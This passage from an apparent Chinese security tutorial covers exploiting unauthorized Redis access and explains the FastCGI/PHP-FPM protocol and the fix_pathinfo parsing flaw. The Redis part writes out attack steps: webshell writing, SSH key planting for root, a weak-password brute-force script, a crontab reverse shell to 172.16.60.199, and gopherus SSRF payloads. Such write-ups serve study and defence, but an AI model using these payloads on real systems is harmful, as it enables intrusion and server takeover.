&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;xxxxxxxxxx set x &amp;quot;\n\n&amp;lt;?php phpinfo();?&amp;gt;\n\n&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;用 redis 写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;访问redis.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者使用&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                                                                                ?&amp;gt;&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exit();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;使用公钥私钥获取root权限&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用公钥私钥获取root权限&#34;&gt;#&lt;/a&gt; 使用公钥私钥获取 root 权限&lt;/h4&gt;
&lt;p&gt;生成公私钥，默认路径为 /root/.ssh&lt;/p&gt;
&lt;p&gt;本地生成私钥和公钥，将公钥写入备份文件，使用本地私钥登录&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh-keygen -t rsa&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;修改工作路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;config set dir /root/.ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;config set dbfilename authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set pub &amp;quot;我们刚刚生成的公钥&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;登录：ssh -i id_rsa root@172.16.60.166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id -&amp;gt; 得到root&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;redis未授权访问检测脚本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#redis未授权访问检测脚本&#34;&gt;#&lt;/a&gt; redis 未授权访问检测脚本&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#! /usr/bin/env python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# _*_  coding:utf-8 _*_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PASSWORD_DIC=[&amp;#x27;redis&amp;#x27;,&amp;#x27;root&amp;#x27;,&amp;#x27;oracle&amp;#x27;,&amp;#x27;password&amp;#x27;,&amp;#x27;p@aaw0rd&amp;#x27;,&amp;#x27;abc123!&amp;#x27;,&amp;#x27;123456&amp;#x27;,&amp;#x27;admin&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def check(ip, port, timeout):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        socket.setdefaulttimeout(timeout)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s.connect((ip, int(port)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s.send(&amp;quot;INFO\r\n&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        result = s.recv(1024)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if &amp;quot;redis_version&amp;quot; in result:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return u&amp;quot;未授权访问&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        elif &amp;quot;Authentication&amp;quot; in result:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            for pass_ in PASSWORD_DIC:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                s.connect((ip, int(port)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                s.send(&amp;quot;AUTH %s\r\n&amp;quot; %(pass_))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                result = s.recv(1024)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                if &amp;#x27;+OK&amp;#x27; in result:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    return u&amp;quot;存在弱口令，密码：%s&amp;quot; % (pass_)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    except Exception, e:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ip=sys.argv[1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    port=sys.argv[2]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print check(ip,port, timeout=10)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;利用任务计划反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用任务计划反弹shell&#34;&gt;#&lt;/a&gt; 利用任务计划反弹 shell&lt;/h4&gt;
&lt;p&gt;攻击者监听端口&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc -lvnp 4444&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;将备份放入任务计划中，同时将 crontab 内容写入文件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;set xxx &amp;quot;\n\n*/1 * * * * /bin/bash -i&amp;gt;&amp;amp;/dev/tcp/172.16.60.199/1234 0&amp;gt;&amp;amp;1\n\n&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;config set dir /var/spool/cron &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;config set dbfilename  root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;save&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在反弹的 shell 中可以看数据库连接文件等，同时谁启动的 Redis 反弹就是谁的权限&lt;/p&gt;
&lt;h4 id=&#34;利用ssrf中curl函数请求redis未授权访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用ssrf中curl函数请求redis未授权访问&#34;&gt;#&lt;/a&gt; 利用 ssrf 中 curl 函数请求 Redis 未授权访问&lt;/h4&gt;
&lt;p&gt;gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，在构成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中最强大的协议。而 curl_exec 也是 tcp 的因此可以实现&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1nb3BoZXJ1cy11dTdtNTMwMGEucHk=&#34;&gt;利用 gopherus.py&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;写入 webshell / 反弹 webshell&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python gopherus.py --exploit redis &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;phpwebshell/reverseshell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;需要写入的payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;得到最终的payload&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意：最后得到的 payload 如果从 url 输入需要二次编码，但使用 curl 命令就不需要&lt;/p&gt;
&lt;p&gt;两次因为 gopher 解码一次，url 解码一次&lt;/p&gt;
&lt;h3 id=&#34;fastcgifpm未授权访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fastcgifpm未授权访问&#34;&gt;#&lt;/a&gt; FastCGI，FPM 未授权访问&lt;/h3&gt;
&lt;p&gt;前置知识&lt;/p&gt;
&lt;p&gt;1.fastcgi &amp;amp;&amp;amp; fastcgi record&lt;/p&gt;
&lt;p&gt;Fastcgi 其实是一个通信协议，和 HTTP 协议一样，都是进行数据交换的一个通道。&lt;/p&gt;
&lt;p&gt;fastcgi 协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi 协议由多个 record 组成，record 也有 header 和 body 一说，服务器中间件将这二者按照 fastcgi 的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。&lt;/p&gt;
&lt;p&gt;record 组成如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;typedef struct &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  /* Header */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned char version; // 版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned char type; // 本次record的类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned char requestIdB1; // 本次record对应的请求id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned char requestIdB0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned char contentLengthB1; // body体的大小&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned char contentLengthB0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned char paddingLength; // 额外块大小&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned char reserved; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  /* Body */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned char contentData[contentLength];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned char paddingData[paddingLength];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; FCGI_Record;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;头由 8 个 uchar 类型的变量组成，每个变量 1 字节。其中， &lt;code&gt;requestId&lt;/code&gt;  占两个字节，一个唯一的标志 id，以避免多个请求之间的影响； &lt;code&gt;contentLength&lt;/code&gt;  占两个字节，表示 body 的大小。&lt;/p&gt;
&lt;p&gt;语言端解析了 fastcgi 头以后，拿到 &lt;code&gt;contentLength&lt;/code&gt; ，然后再在 TCP 流里读取大小等于 &lt;code&gt;contentLength&lt;/code&gt;  的数据，这就是 body 体。一个 fastcgi record 结构最大支持的 body 大小是 &lt;code&gt;2^16&lt;/code&gt; ，也就是 65536 字节。&lt;/p&gt;
&lt;p&gt;2.fastcgi type&lt;/p&gt;
&lt;p&gt;&lt;code&gt;type&lt;/code&gt;  就是指定该 record 的作用。因为 fastcgi 一个 record 的大小是有限的，作用也是单一的，所以我们需要在一个 TCP 流里传输多个 record。通过 &lt;code&gt;type&lt;/code&gt;  来标志每个 record 的作用，用 &lt;code&gt;requestId&lt;/code&gt;  作为同一次请求的 id。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/e29518b1-3574-426f-b75f-8cabbb89a15a.9efc537226ce.jpg&#34; alt=&#34;14931267923354.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是 &lt;code&gt;type&lt;/code&gt;  为 1 的 record，后续互相交流，发送 &lt;code&gt;type&lt;/code&gt;  为 4、5、6、7 的 record，结束时发送 &lt;code&gt;type&lt;/code&gt;  为 2、3 的 record。&lt;/p&gt;
&lt;p&gt;3.php fpm&lt;/p&gt;
&lt;p&gt;FPM 其实是一个 fastcgi 协议解析器，Nginx 等服务器中间件将用户请求按照 fastcgi 的规则打包好通过 TCP 传给谁？其实就是传给 FPM。&lt;/p&gt;
&lt;p&gt;用户访问 &lt;code&gt;http://127.0.0.1/index.php?a=1&amp;amp;b=2&lt;/code&gt; ，如果 web 目录是 &lt;code&gt;/var/www/html&lt;/code&gt; ，那么 Nginx 会将这个请求变成如下 key-value 对：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;GATEWAY_INTERFACE&amp;#x27;: &amp;#x27;FastCGI/1.0&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;REQUEST_METHOD&amp;#x27;: &amp;#x27;GET&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SCRIPT_FILENAME&amp;#x27;: &amp;#x27;/var/www/html/index.php&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SCRIPT_NAME&amp;#x27;: &amp;#x27;/index.php&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;QUERY_STRING&amp;#x27;: &amp;#x27;?a=1&amp;amp;b=2&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;REQUEST_URI&amp;#x27;: &amp;#x27;/index.php?a=1&amp;amp;b=2&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;DOCUMENT_ROOT&amp;#x27;: &amp;#x27;/var/www/html&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SERVER_SOFTWARE&amp;#x27;: &amp;#x27;php/fcgiclient&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;REMOTE_ADDR&amp;#x27;: &amp;#x27;127.0.0.1&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;REMOTE_PORT&amp;#x27;: &amp;#x27;12345&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SERVER_ADDR&amp;#x27;: &amp;#x27;127.0.0.1&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SERVER_PORT&amp;#x27;: &amp;#x27;80&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SERVER_NAME&amp;#x27;: &amp;quot;localhost&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SERVER_PROTOCOL&amp;#x27;: &amp;#x27;HTTP/1.1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;PHP-FPM 拿到 fastcgi 的数据包后，进行解析，得到上述这些环境变量。然后，执行 &lt;code&gt;SCRIPT_FILENAME&lt;/code&gt;  的值指向的 PHP 文件，也就是 &lt;code&gt;/var/www/html/index.php&lt;/code&gt; 。&lt;/p&gt;
&lt;h4 id=&#34;iis70解析漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#iis70解析漏洞&#34;&gt;#&lt;/a&gt; IIS7.0 解析漏洞&lt;/h4&gt;
&lt;p&gt;漏洞现象是，在用户访问 &lt;code&gt;http://127.0.0.1/favicon.ico/.php&lt;/code&gt;  时，访问到的文件是 favicon.ico，但却按照.php 后缀解析了。&lt;/p&gt;
&lt;p&gt;用户请求 &lt;code&gt;http://127.0.0.1/favicon.ico/.php&lt;/code&gt; ，nginx 将会发送如下环境变量到 fpm 里：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SCRIPT_FILENAME&amp;#x27;: &amp;#x27;/var/www/html/favicon.ico/.php&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SCRIPT_NAME&amp;#x27;: &amp;#x27;/favicon.ico/.php&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;REQUEST_URI&amp;#x27;: &amp;#x27;/favicon.ico/.php&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;DOCUMENT_ROOT&amp;#x27;: &amp;#x27;/var/www/html&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;正常来说， &lt;code&gt;SCRIPT_FILENAME&lt;/code&gt;  的值是一个不存在的文件 &lt;code&gt;/var/www/html/favicon.ico/.php&lt;/code&gt; ，是 PHP 设置中的一个选项 &lt;code&gt;fix_pathinfo&lt;/code&gt;  导致了这个漏洞。PHP 为了支持 Path Info 模式而创造了 &lt;code&gt;fix_pathinfo&lt;/code&gt; ，在这个选项被打开的情况下，fpm 会判断 &lt;code&gt;SCRIPT_FILENAME&lt;/code&gt;  是否存在，如果不存在则去掉最后一个 &lt;code&gt;/&lt;/code&gt;  及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。&lt;/p&gt;
&lt;p&gt;所以，第一次 fpm 发现 &lt;code&gt;/var/www/html/favicon.ico/.php&lt;/code&gt;  不存在，则去掉 &lt;code&gt;/.php&lt;/code&gt; ，再判断 &lt;code&gt;/var/www/html/favicon.ico&lt;/code&gt;  是否存在。显然这个文件是存在的，于是被作为 PHP 文件执行，导致解析漏洞。&lt;/p&gt;
